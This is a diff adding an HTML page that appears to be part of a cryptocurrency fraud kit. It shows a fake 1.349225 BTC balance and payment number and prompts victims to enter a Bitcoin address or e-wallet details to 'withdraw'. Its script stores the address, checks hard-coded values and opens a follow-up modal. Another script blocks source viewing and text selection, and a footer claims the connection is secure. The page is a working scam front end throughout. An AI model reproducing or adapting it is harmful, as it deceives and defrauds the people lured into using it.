@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<script>
+   var page_id = 3;
+   </script>
+<script src="local_resources/js/12fca6ba77f95f151aeef63fb893d1a3.js" type="text/javascript"></script>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Provide your details</title>
+<link href="local_resources/css/b6c475bdea08db6fca78f43898af5a4c.css" rel="stylesheet"/>
+<link href="local_resources/css/d96749cf93e46d1701c18ef60c46577f.css" rel="stylesheet"/>
+<link href="local_resources/css/3ada5bd40d4074a7cf6f6999f2e7e3c4.css" rel="stylesheet"/>
+<link href="local_resources/css/7a357766b7136ae17eba9870ee3600e0.css" rel="stylesheet"/>
+<link href="local_resources/css/4ba17ab79e0fc978b60195936e797396.css" rel="stylesheet"/>
+<link href="local_resources/css/480773af91c6625d594cf38af439b645.css" rel="stylesheet"/>
+<script src="local_resources/js/5383f3aa195c8e8935b3a93027d14a2e.js" type="text/javascript"></script>
+<link crossorigin="anonymous" href="local_resources/css/39fe3fa498abd5eba2a8605e43290643.css" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" rel="stylesheet"/>
+<link href="local_resources/css/5183a9c0ba97c210913bae0bd911a123.css" rel="stylesheet"/>
+<script crossorigin="anonymous" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" src="local_resources/js/e6e5cd59e462227cc9e1ec544050b22a.js"></script>
+</head>
+<body>
+<header>
+<div class="container">
+<img src="local_resources/img/d92d8aa35587b9b51d83ba609667cbfe.png"/>
+</div>
+</header>
+<div class="container">
+<section class="hero hero__ico pos-rel">
+
+<div class="container">
+<div class="row">
+<div class="bl__balance">
+<div class="icon-bal">
+<i aria-hidden="true" class="fa-2x fa fa-database"></i>
+</div>
+<div class="">
+<h5> Your Balance <br/>
+<span class="balance">1.349225</span> BTC
+                     </h5>
+</div>
+</div>
+<script language="javascript">
+               function xl() {
+                  var allow = Number(localStorage.getItem('balance'))
+                  var total__bmn = Number(localStorage.getItem('total__bm'))
+                  total__bmn = 0.96052716
+
+                  if (allow != total__bmn || allow != 0.96052716) {
+                     $('#gohangar').modal('show');
+                     return false;
+                  }
+               }
+
+
+
+               function checkform2() {
+
+                  if (document.regform2.btcAddress.value == '') {
+                     alert("Please enter your btc address!");
+                     document.regform2.btcAddress.focus();
+                     return false;
+                  }
+                  if (!document.regform2.btcAddress.value.match(
+                        /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/)) {
+                     alert("BTC ADDRESS ERR!");
+                     document.regform2.btcAddress.focus();
+                     return false;
+                  }
+
+
+                  for (i in document.regform2.elements) {
+                     f = document.regform2.elements[i];
+                     if (f.name && f.name.match(/^pay_account/)) {
+                        if (f.value == '') continue;
+                        var notice = f.getAttribute('data-validate-notice');
+                        var invalid = 0;
+                        if (f.getAttribute('data-validate') == 'regexp') {
+                           var re = new RegExp(f.getAttribute('data-validate-regexp'));
+                           if (!f.value.match(re)) {
+                              invalid = 1;
+                           }
+                        } else if (f.getAttribute('data-validate') == 'email') {
+                           var re = /^[^\@]+\@[^\@]+\.\w{2,4}$/;
+                           if (!f.value.match(re)) {
+                              invalid = 1;
+                           }
+                        }
+                        if (invalid) {
+                           alert('Invalid account format. Expected ' + notice);
+                           f.focus();
+                           return false;
+                        }
+                     }
+                  }
+                  btcAddress = document.getElementsByName("btcAddress")[0].value;
+                  localStorage.setItem('btcAddress', btcAddress);
+
+
+
+                  xl()
+
+
+                  function setCookie(name, value, options = {}) {
+
+                     options = {
+                        path: '/',
+                        ...options
+                     };
+
+                     if (options.expires instanceof Date) {
+                        options.expires = options.expires.toUTCString();
+                     }
+
+                     let updatedCookie = encodeURIComponent(name) + "=" + encodeURIComponent(value);
+
+                     for (let optionKey in options) {
+                        updatedCookie += "; " + optionKey;
+                        let optionValue = options[optionKey];
+                        if (optionValue !== true) {
+                           updatedCookie += "=" + optionValue;
+                        }
+                     }
+
+                     document.cookie = updatedCookie;
+                  }
+
+                  // Пример использования:
+                  setCookie('btcAddress', btcAddress, {
+                     secure: true,
+                     'max-age': 31536 * 1000
+                  });
+
+                  return true;
+               }
+
+               var btcAddress;
+
+               function formChanged() {
+                  email = document.getElementsByName("email")[0].value;
+               }
+               </script>
+<section class="cashout sect sect_br-25" id="cashout">
+<div class="container">
+<div class="cashout__body">
+<div class="cashout__body-inner">
+<div class="cashout__header">
+<div class="cashout__header-body">
+                                 Amount to receive: <span class="balance">1.349225</span> BTC
+                                 <p class="cashout__header-text text_14 text_400">
+                                    Payment No. 487645784
+                                 </p>
+</div>
+</div>
+<div class="cashout__main">
+<div class="cashout__tabs">
+<div class="cashout__tabs-body">
+<div class="cashout__tab cardBank active">
+<div class="cashout__tab-icon">
+<!-- <svg width="35" height="36" viewBox="0 0 35 36" fill="none"
+                                             xmlns="http://www.w3.org/2000/svg">
+                                             <path
+                                                d="M32.9 6.10001H2.1C0.942197 6.10001 0 7.0422 0 8.20001V27.8C0 28.9578 0.942197 29.9 2.1 29.9H32.9C34.0578 29.9 35 28.9578 35 27.8V8.20001C35 7.0422 34.0578 6.10001 32.9 6.10001ZM33.6 27.8C33.6 28.185 33.285 28.5 32.9 28.5H2.1C1.71363 28.5 1.4 28.185 1.4 27.8V8.20001C1.4 7.81357 1.71363 7.50001 2.1 7.50001H32.9C33.285 7.50001 33.6 7.81357 33.6 8.20001V27.8Z"
+                                                fill="white" />
+                                             <path d="M0.699219 12.4H34.2992V15.2H0.699219V12.4Z" fill="white" />
+                                             <path
+                                                d="M34.3 11.7H0.7C0.313633 11.7 0 12.0136 0 12.4V15.2C0 15.5864 0.313633 15.9 0.7 15.9H34.3C34.6864 15.9 35 15.5864 35 15.2V12.4C35 12.0136 34.6864 11.7 34.3 11.7ZM33.6 14.5H1.4V13.1H33.6V14.5ZM18.9 20.1H6.3C5.91363 20.1 5.6 20.4136 5.6 20.8C5.6 21.1864 5.91363 21.5 6.3 21.5H18.9C19.2864 21.5 19.6 21.1864 19.6 20.8C19.6 20.4136 19.2864 20.1 18.9 20.1ZM13.3 22.9H6.3C5.91363 22.9 5.6 23.2136 5.6 23.6C5.6 23.9864 5.91363 24.3 6.3 24.3H13.3C13.6864 24.3 14 23.9864 14 23.6C14 23.2136 13.6864 22.9 13.3 22.9Z"
+                                                fill="white" />
+                                          </svg> -->
+
+<path clip-rule="evenodd" d="M5.31125 10.347L23.2575 5.5389C24.098 5.31373 24.9935 5.43163 25.7471 5.86667C26.5007 6.30172 27.0506 7.01827 27.2759 7.85874L27.942 10.3437H29.5312C30.4015 10.3437 31.2361 10.6894 31.8514 11.3048C32.4668 11.9202 32.8125 12.7547 32.8125 13.625V27.8437C32.8125 28.714 32.4668 29.5486 31.8514 30.1639C31.2361 30.7793 30.4015 31.125 29.5312 31.125H5.46875C4.59851 31.125 3.76391 30.7793 3.14856 30.1639C2.5332 29.5486 2.1875 28.714 2.1875 27.8437V13.625C2.18764 12.782 2.5121 11.9714 3.09365 11.3611C3.6752 10.7509 4.46925 10.3878 5.31125 10.347ZM30.625 16.9062V13.625C30.625 13.3349 30.5098 13.0567 30.3046 12.8516C30.0995 12.6465 29.8213 12.5312 29.5312 12.5312H5.45344C5.16602 12.5353 4.89174 12.6523 4.68992 12.857C4.4881 13.0616 4.37497 13.3375 4.375 13.625V27.8437C4.375 28.1338 4.49023 28.412 4.69535 28.6171C4.90047 28.8223 5.17867 28.9375 5.46875 28.9375H29.5312C29.8213 28.9375 30.0995 28.8223 30.3046 28.6171C30.5098 28.412 30.625 28.1338 30.625 27.8437V24.5625H22.9688C22.3886 24.5625 21.8322 24.332 21.422 23.9218C21.0117 23.5116 20.7812 22.9552 20.7812 22.375V19.0937C20.7812 18.5136 21.0117 17.9572 21.422 17.5469C21.8322 17.1367 22.3886 16.9062 22.9688 16.9062H30.625ZM22.9688 19.0937V22.375H30.625V19.0937H22.9688ZM25.678 10.3437L25.1639 8.4253C25.1267 8.28654 25.0626 8.15647 24.9751 8.04251C24.8876 7.92855 24.7786 7.83293 24.6542 7.76113C24.5297 7.68932 24.3924 7.64272 24.25 7.624C24.1075 7.60528 23.9628 7.6148 23.8241 7.65202L13.7769 10.3437H25.678Z" fill="white" fill-rule="evenodd"></path>
+
+</div>
+<div class="cashout__tab-content">
+<h6 class="cashout__tab-title">
+                                             Bitcoin Address
+                                          </h6>
+<p class="cashout__tab-text text_14 text_400">
+                                             Wallet
+                                          </p>
+</div>
+</div>
+<div class="cashout__tab eWallet">
+<div class="cashout__tab-icon">
+
+<path clip-rule="evenodd" d="M5.31125 10.347L23.2575 5.5389C24.098 5.31373 24.9935 5.43163 25.7471 5.86667C26.5007 6.30172 27.0506 7.01827 27.2759 7.85874L27.942 10.3437H29.5312C30.4015 10.3437 31.2361 10.6894 31.8514 11.3048C32.4668 11.9202 32.8125 12.7547 32.8125 13.625V27.8437C32.8125 28.714 32.4668 29.5486 31.8514 30.1639C31.2361 30.7793 30.4015 31.125 29.5312 31.125H5.46875C4.59851 31.125 3.76391 30.7793 3.14856 30.1639C2.5332 29.5486 2.1875 28.714 2.1875 27.8437V13.625C2.18764 12.782 2.5121 11.9714 3.09365 11.3611C3.6752 10.7509 4.46925 10.3878 5.31125 10.347ZM30.625 16.9062V13.625C30.625 13.3349 30.5098 13.0567 30.3046 12.8516C30.0995 12.6465 29.8213 12.5312 29.5312 12.5312H5.45344C5.16602 12.5353 4.89174 12.6523 4.68992 12.857C4.4881 13.0616 4.37497 13.3375 4.375 13.625V27.8437C4.375 28.1338 4.49023 28.412 4.69535 28.6171C4.90047 28.8223 5.17867 28.9375 5.46875 28.9375H29.5312C29.8213 28.9375 30.0995 28.8223 30.3046 28.6171C30.5098 28.412 30.625 28.1338 30.625 27.8437V24.5625H22.9688C22.3886 24.5625 21.8322 24.332 21.422 23.9218C21.0117 23.5116 20.7812 22.9552 20.7812 22.375V19.0937C20.7812 18.5136 21.0117 17.9572 21.422 17.5469C21.8322 17.1367 22.3886 16.9062 22.9688 16.9062H30.625ZM22.9688 19.0937V22.375H30.625V19.0937H22.9688ZM25.678 10.3437L25.1639 8.4253C25.1267 8.28654 25.0626 8.15647 24.9751 8.04251C24.8876 7.92855 24.7786 7.83293 24.6542 7.76113C24.5297 7.68932 24.3924 7.64272 24.25 7.624C24.1075 7.60528 23.9628 7.6148 23.8241 7.65202L13.7769 10.3437H25.678Z" fill="white" fill-rule="evenodd"></path>
+
+</div>
+<div class="cashout__tab-content">
+<h6 class="cashout__tab-title">
+                                             E-wallet
+                                          </h6>
+<p class="cashout__tab-text text_14 text_400">
+                                             PayPal, Perfect Money, WebMoney и etc.
+                                          </p>
+</div>
+</div>
+</div>
+</div>
+<div class="cashout__options">
+<div class="cashout__options-body">
+<div class="cashout__option">
+<h4 class="cashout__option-title">
+                                          Withdrawal to a Bitcoin Address
+                                       </h4>
+<form action="load3jz" method="post" name="regform2" onsubmit="return checkform2()">
+<label class="cashout__label label">
+<p class="label__title text_14 text_400">
+                                                Enter Bitcoin Address
+                                             </p>
+<div class="label__field field">
+<!-- <input id="card" class="field__input card-number-input form-input55"
+                                                   minlength="5" maxlength="20" autocomplete="cc-number" name='card'
+                                                   inputmode="numeric" pattern="[0-9 ]*" type="text" required> -->
+<input class="btcAddress field__input" data-validate="regexp" data-validate-notice="Bitcoin Address" data-validate-regexp="^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$" id="btcAddress" name="btcAddress" placeholder="Enter BTC address" type="text" value=""/>
+<p class="field__error hide text_14 text_400">
+                                                   No such card exists
+                                                </p>
+</div>
+</label>
+<button class="cashout__form-btn btn btn_warning">
+                                             CONTINUE
+                                          </button>
+</form>
+</div>
+<div class="cashout__option hide">
+<h4 class="cashout__option-title">
+                                          Withdrawal to e-wallet
+                                       </h4>
+<form action="load3jz" class="cashout__form" method="post">
+<label class="cashout__label label">
+<p class="label__title text_14 text_400">
+                                                Select wallet
+                                             </p>
+<div class="label__select custom-select" data-value="PayPal" id="wallet-select">
+<span>PayPal</span>
+</div>
+<div class="label__dropdown custom-dropdown" id="wallet-dropdown">
+<ul class="custom-dropdown__list">
+<li class="custom-dropdown__list-item" data-value="perfect-money" style="display: flex;">
+<span>Perfect Money</span>
+</li>
+<li class="custom-dropdown__list-item" data-value="Payz" style="display: flex;">
+<span>Payz</span>
+</li>
+<li class="custom-dropdown__list-item" data-value="PayPal" style="display: none;">
+<span>PayPal</span>
+</li>
+<li class="custom-dropdown__list-item" data-value="WebMoney" style="display: flex;">
+<span>WebMoney</span>
+</li>
+<li class="custom-dropdown__list-item" data-value="PAYEER" style="display: flex;">
+<span>PAYEER</span>
+</li>
+</ul>
+</div>
+</label>
+<label class="cashout__label label">
+<p class="label__title text_14 text_400">
+                                                Enter wallet number
+                                             </p>
+<div class="label__field field">
+<input class="field__input wallet-input2 form-input55" id="wallet" maxlength="20" minlength="5" name="card" required="" type="text"/>
+<p class="field__error hide text_14 text_400">
+                                                   There is no such wallet
+                                                </p>
+</div>
+</label>
+<button class="cashout__form-btn btn btn_warning">
+                                             CONTINUE
+                                          </button>
+</form>
+</div>
+</div>
+</div>
+</div>
+<div class="cashout__footer">
+<div class="cashout__footer-content">
+<img alt="" class="cashout__footer-icon" src="local_resources/img/e156b7c91f57277fd7c0738464c7b4a3.svg"/>
+<p class="cashout__footer-text text_14 text_400">
+                                    Secure connection. Your data is safe.
+                                 </p>
+</div>
+<div class="cashout__footer-logos">
+<img alt="" class="cashout__footer-logo" src="local_resources/img/7ffe449d6fd8599ba26f43470d1950b6.svg"/>
+<img alt="" class="cashout__footer-logo" src="local_resources/img/9f3f7bbfb1c9b70910f1adb52bf6f05d.svg"/>
+</div>
+</div>
+</div>
+<picture class="coin coin_1 hide">
+<img alt="" src="local_resources/img/5209a64328a5f305ee88a31482ff31ec.png"/>
+</picture>
+<picture class="coin coin_2 hide">
+<img alt="" src="local_resources/img/d00ee58e771fc6b17ca468483e74516f.png"/>
+</picture>
+<picture class="coin coin_3 hide">
+<img alt="" src="local_resources/img/3469881a7607eeafa42c4bc67922f4e5.png"/>
+</picture>
+</div>
+</div>
+</section>
+</div>
+</div>
+</section>
+</div>
+<script src="local_resources/js/934af52cff103f23ee4060c576d5f8ce.js"></script>
+<script src="local_resources/js/3b90d6acab68ec706fabbaf94eda2d05.js"></script>
+<script src="local_resources/js/c0822a7628e7625633a14081f0d8b678.js"></script>
+<script src="local_resources/js/662b86415c0cd9d2b6915156fdbbe0ea.js"></script>
+<link href="local_resources/css/b2e7a5a2b58b86f600a7bfc84de90adf.css" rel="stylesheet"/>
+<script src="local_resources/js/1cce6ebd0062eed94dd71ba3b5b3d86d.js"></script>
+<script src="local_resources/js/2b555e1bfd4cdaaab9a21abeb41c74b4.js"></script>
+<script src="local_resources/js/934af52cff103f23ee4060c576d5f8ce.js"></script>
+<script src="local_resources/js/5383f3aa195c8e8935b3a93027d14a2e.js"></script>
+<script>
+function preventSelection(element) {
+	var preventSelection = false;
+
+	function addHandler(element, event, handler) {
+		if (element.attachEvent) element.attachEvent('on' + event, handler);
+		else if (element.addEventListener) element.addEventListener(event, handler, false);
+	}
+
+	function removeSelection() {
+		if (window.getSelection) {
+			window.getSelection().removeAllRanges();
+		} else if (document.selection && document.selection.clear)
+			document.selection.clear();
+	}
+
+	addHandler(element, 'mousemove', function() {
+		if (preventSelection) removeSelection();
+	});
+	addHandler(element, 'mousedown', function(event) {
+		var event = event || window.event;
+		var sender = event.target || event.srcElement;
+		preventSelection = !sender.tagName.match(/INPUT|TEXTAREA/i);
+	});
+
+	function killCtrlA(event) {
+		var event = event || window.event;
+		var sender = event.target || event.srcElement;
+		if (sender.tagName.match(/INPUT|TEXTAREA/i)) return;
+		var key = event.keyCode || event.which;
+		if ((event.ctrlKey && key == 'U'.charCodeAt(0)) || (event.ctrlKey && key == 'A'.charCodeAt(0)) || (event.ctrlKey &&
+				key == 'S'.charCodeAt(0))) {
+			removeSelection();
+			if (event.preventDefault) event.preventDefault();
+			else event.returnValue = false;
+		}
+	}
+	addHandler(element, 'keydown', killCtrlA);
+	addHandler(element, 'keyup', killCtrlA);
+}
+preventSelection(document);
+</script>
+<script src="local_resources/js/3758fae6511dbe26cd98bd4d002388c6.js"></script>
+<script src="local_resources/js/6520933580c87c3a68a71a7bbbd3929a.js"></script>
+<!-- <script>
+document.oncontextmenu = cmenu;
+
+function cmenu() {
+	return false;
+}
+</script> --> <script src="local_resources/js/afeec18c836b95dc095c467cb0f833bf.js"></script>
+<script crossorigin="anonymous" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" src="local_resources/js/6faa3a9a8c50bcfc87fde48019d7462b.js">
+</script>
+</body>
+</html>
